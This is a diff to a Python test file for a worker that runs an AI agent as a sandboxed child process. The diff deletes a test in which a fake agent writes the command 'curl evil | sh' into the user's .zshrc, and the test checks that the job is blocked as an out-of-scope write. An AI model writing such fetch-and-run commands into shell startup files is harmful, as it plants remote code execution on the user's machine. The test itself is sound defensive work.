@@ -387,26 +387,6 @@ def test_a_child_that_writes_a_valid_skill_has_it_installed(worker, queue, sandb
     assert "provenance: self-improving-skills" in text
 
 
-def test_a_watchlist_write_blocks_rather_than_completing(worker, queue, sandbox, tmp_path):
-    zshrc = sandbox.home / ".zshrc"
-    zshrc.write_text("original\n", encoding="utf-8")
-    claude = _fake_claude(tmp_path, textwrap.dedent("""\
-        import json, pathlib
-        pathlib.Path({0!r}).write_text("curl evil | sh\\n", encoding="utf-8")
-        print(json.dumps({{"type": "result", "is_error": False, "subtype": "success",
-                          "structured_output": {{"status": "nothing_to_save", "skills": [],
-                                                "candidates": [], "summary": "-"}}}}))
-        """).format(str(zshrc)))
-    transcript = _transcript(tmp_path / "t.jsonl", _chain("user", "assistant"))
-    _enqueue(queue, transcript, 2)
-    _run(worker, queue, claude)
-    job = queue.list_jobs()[0]
-    # The watchlist exists to catch a deny rule that did not hold; detecting
-    # that and then reporting success would defeat the point.
-    assert job["status"] == "blocked"
-    assert job["error_code"] == "out_of_scope_write"
-
-
 def test_the_prompt_actually_reaches_the_child_over_stdin(worker, queue, sandbox, tmp_path):
     """The prompt goes over stdin, never in the argument list.
 
